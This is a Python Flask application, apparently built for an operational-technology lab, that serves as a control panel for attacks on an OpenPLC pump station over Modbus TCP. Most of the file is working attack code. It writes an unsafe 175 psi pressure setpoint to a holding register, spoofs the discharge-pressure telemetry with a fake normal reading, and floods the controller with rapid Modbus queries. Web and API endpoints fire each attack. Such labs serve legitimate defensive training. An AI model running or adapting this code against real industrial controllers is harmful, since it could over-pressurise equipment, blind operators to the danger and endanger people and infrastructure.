import os
import time
import json
import logging
from flask import Flask, render_template_string, request, jsonify
from pymodbus.client import ModbusTcpClient

# Configure logging for Azure Log Analytics ingestion
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# Container Environment Configurations
PLC_HOST = os.environ.get("PLC_HOST", "pump-station-openplc")
PLC_PORT = int(os.environ.get("PLC_PORT", 502))
HTTP_PORT = int(os.environ.get("HTTP_PORT", 5000))

# OpenPLC Modbus Register Mapping
HR_DISCH_PRESS = 0       # HMI Discharge Pressure Telemetry (Scaled x10)
HR_SETPOINT_PRESS = 1024  # HMI Discharge Pressure Setpoint (Scaled x10)

# ----------------------------------------------------------------------------
# Synchronous Direct Attack Functions (No Threading)
# ----------------------------------------------------------------------------

def run_attack_1(target_setpoint_psi=175.0):
    """
    Attack 1 (MITRE T0836 - Modify Parameter):
    Directly writes an unsafe setpoint (175.0 psi) to Holding Register 1024.
    """
    scaled_setpoint = int(target_setpoint_psi * 10)
    result = {
        "attack": "Attack 1: Setpoint Tampering (MITRE T0836)",
        "target_psi": target_setpoint_psi,
        "register": HR_SETPOINT_PRESS,
        "status": "UNKNOWN"
    }
    try:
        client = ModbusTcpClient(PLC_HOST, port=PLC_PORT, timeout=3)
        if client.connect():
            # Read current value
            rr = client.read_holding_registers(address=HR_SETPOINT_PRESS, count=1)
            if not rr.isError():
                result["previous_psi"] = rr.registers[0] / 10.0
                logging.info(f"[ATTACK-1] Read current setpoint: {result['previous_psi']:.1f} psi")
            
            # Write injected setpoint
            wr = client.write_register(address=HR_SETPOINT_PRESS, value=scaled_setpoint)
            if not wr.isError():
                logging.warning(f"[ATTACK-1 SUCCESS] Injected setpoint {target_setpoint_psi} psi into HR {HR_SETPOINT_PRESS}")
                result["status"] = "SUCCESS"
                result["message"] = f"Successfully injected setpoint {target_setpoint_psi} psi into HR {HR_SETPOINT_PRESS}"
            else:
                logging.error(f"[ATTACK-1 FAILED] Modbus write error: {wr}")
                result["status"] = "FAILED"
                result["message"] = f"Modbus write error: {wr}"
            client.close()
        else:
            logging.error(f"[ATTACK-1] Connection failed to {PLC_HOST}:{PLC_PORT}")
            result["status"] = "FAILED"
            result["message"] = f"Failed connection to {PLC_HOST}:{PLC_PORT}"
    except Exception as e:
        logging.error(f"[ATTACK-1 ERROR] Exception: {e}")
        result["status"] = "ERROR"
        result["message"] = str(e)
    
    return result

def run_attack_2(spoof_disch_psi=120.0):
    """
    Attack 2 (MITRE T0856 - Spoof Reporting Message):
    Directly overwrites discharge pressure register to report fake normal reading (120.0 psi).
    """
    scaled_spoof = int(spoof_disch_psi * 10)
    result = {
        "attack": "Attack 2: Telemetry Spoofing (MITRE T0856)",
        "spoofed_psi": spoof_disch_psi,
        "register": HR_DISCH_PRESS,
        "status": "UNKNOWN"
    }
    try:
        client = ModbusTcpClient(PLC_HOST, port=PLC_PORT, timeout=2)
        if client.connect():
            wr = client.write_register(address=HR_DISCH_PRESS, value=scaled_spoof)
            if not wr.isError():
                logging.warning(f"[ATTACK-2 SPOOF] Overwrote HR {HR_DISCH_PRESS} -> {spoof_disch_psi} psi")
                result["status"] = "SUCCESS"
                result["message"] = f"Successfully overwrote HR {HR_DISCH_PRESS} with fake reading {spoof_disch_psi} psi"
            else:
                logging.error(f"[ATTACK-2 FAILED] Write error: {wr}")
                result["status"] = "FAILED"
                result["message"] = f"Modbus write error: {wr}"
            client.close()
        else:
            logging.error(f"[ATTACK-2] Connection failed to {PLC_HOST}:{PLC_PORT}")
            result["status"] = "FAILED"
            result["message"] = f"Connection failed to {PLC_HOST}:{PLC_PORT}"
    except Exception as e:
        logging.error(f"[ATTACK-2 ERROR] Exception: {e}")
        result["status"] = "ERROR"
        result["message"] = str(e)

    return result

def run_attack_3(burst_size=50):
    """
    Attack 3 (MITRE T0814 - Denial of Service):
    Directly executes a rapid-fire burst of Modbus queries against port 502.
    """
    result = {
        "attack": "Attack 3: Modbus Traffic Flooding (MITRE T0814)",
        "burst_size": burst_size,
        "status": "UNKNOWN"
    }
    try:
        client = ModbusTcpClient(PLC_HOST, port=PLC_PORT, timeout=1)
        if client.connect():
            success_count = 0
            for _ in range(burst_size):
                rr = client.read_holding_registers(address=0, count=10)
                if not rr.isError():
                    success_count += 1
            logging.warning(f"[ATTACK-3 FLOOD] Executed burst: {success_count}/{burst_size} queries accepted")
            result["status"] = "SUCCESS" if success_count > 0 else "FAILED"
            result["accepted_queries"] = success_count
            result["message"] = f"Burst complete: {success_count}/{burst_size} rapid queries accepted"
            client.close()
        else:
            logging.error(f"[ATTACK-3] Connection failed during flood attempt")
            result["status"] = "FAILED"
            result["message"] = f"Connection failed to {PLC_HOST}:{PLC_PORT}"
    except Exception as e:
        logging.error(f"[ATTACK-3 ERROR] Exception during burst: {e}")
        result["status"] = "ERROR"
        result["message"] = str(e)

    return result

# ----------------------------------------------------------------------------
# Synchronous Flask Web Control UI (No Threading Needed)
# ----------------------------------------------------------------------------

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OT Attack Simulation Control Panel</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; margin: 0; }
        .container { max-width: 800px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h1 { color: #38bdf8; border-bottom: 2px solid #334155; padding-bottom: 10px; margin-top: 0; }
        .card { background: #334155; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .card h3 { margin-top: 0; color: #f43f5e; }
        button { background: #ef4444; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; }
        button:hover { background: #dc2626; }
        .btn-spoof { background: #f59e0b; }
        .btn-spoof:hover { background: #d97706; }
        .btn-flood { background: #8b5cf6; }
        .btn-flood:hover { background: #7c3aed; }
        .result-box { background: #020617; color: #38bdf8; padding: 15px; font-family: monospace; border-radius: 6px; white-space: pre-wrap; margin-top: 15px; border-left: 4px solid #38bdf8; }
        .info { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ OT Adversary Manual Control UI</h1>
        <p class="info">Target PLC: <strong>{{ plc_host }}:{{ plc_port }}</strong> | Mode: <em>Manual Execution (No Threading)</em></p>
        
        <div class="card">
            <h3>Attack 1: Setpoint Injection (MITRE T0836)</h3>
            <p>Overwrites Holding Register 1024 with an unsafe pressure target (175.0 psi).</p>
            <form action="/trigger" method="POST">
                <input type="hidden" name="attack" value="1">
                <button type="submit">Execute Setpoint Tampering</button>
            </form>
        </div>

        <div class="card">
            <h3>Attack 2: Telemetry Spoofing (MITRE T0856)</h3>
            <p>Forces Discharge Pressure Register 0 to report a fake normal reading (120.0 psi).</p>
            <form action="/trigger" method="POST">
                <input type="hidden" name="attack" value="2">
                <button type="submit" class="btn-spoof">Execute Telemetry Blindfold</button>
            </form>
        </div>

        <div class="card">
            <h3>Attack 3: Modbus Traffic Flooding (MITRE T0814)</h3>
            <p>Fires a burst of 50 rapid-fire Modbus read requests against port 502.</p>
            <form action="/trigger" method="POST">
                <input type="hidden" name="attack" value="3">
                <button type="submit" class="btn-flood">Execute Traffic Flood</button>
            </form>
        </div>

        {% if result %}
        <h2>Execution Output</h2>
        <div class="result-box">{{ result_json }}</div>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(HTML_TEMPLATE, plc_host=PLC_HOST, plc_port=PLC_PORT, result=None)

@app.route("/trigger", methods=["POST"])
def trigger():
    attack_type = request.form.get("attack") or request.args.get("attack")
    result = {}
    
    if attack_type == "1":
        result = run_attack_1(target_setpoint_psi=175.0)
    elif attack_type == "2":
        result = run_attack_2(spoof_disch_psi=120.0)
    elif attack_type == "3":
        result = run_attack_3(burst_size=50)
    else:
        result = {"error": "Invalid attack selection"}

    return render_template_string(
        HTML_TEMPLATE,
        plc_host=PLC_HOST,
        plc_port=PLC_PORT,
        result=result,
        result_json=json.dumps(result, indent=2)
    )

@app.route("/api/execute", methods=["POST", "GET"])
def api_execute():
    attack_type = request.args.get("attack") or (request.json.get("attack") if request.is_json else None)
    if attack_type == "1":
        return jsonify(run_attack_1())
    elif attack_type == "2":
        return jsonify(run_attack_2())
    elif attack_type == "3":
        return jsonify(run_attack_3())
    else:
        return jsonify({"error": "Valid options are attack=1, attack=2, attack=3"}), 400

if __name__ == "__main__":
    logging.info("Starting OT Adversary Manual Control UI (Flask synchronous server)...")
    app.run(host="0.0.0.0", port=HTTP_PORT, debug=False)
